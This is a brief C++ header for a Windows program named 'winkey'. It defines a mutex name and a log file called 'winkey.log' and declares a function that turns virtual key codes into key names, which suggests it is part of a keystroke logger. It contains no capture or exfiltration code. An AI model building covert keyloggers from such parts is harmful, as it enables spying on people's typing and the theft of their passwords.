#ifndef WINKEY_H
# define WINKEY_H

# include <windows.h>
# include <iostream>
# include <fstream>
# include <string>
# include <iomanip>		// For std::setw and std::setfill
# include <thread>		// For sleep_for

// # define TW_NAME		"winkey"
# define TW_MUTEX_NAME	"TYYghhTYU5678FuGHFGFHYFUIY67"
# define TW_LOGFILE		"winkey.log"
std::wstring	GetKeyName(UINT vkCode);

#endif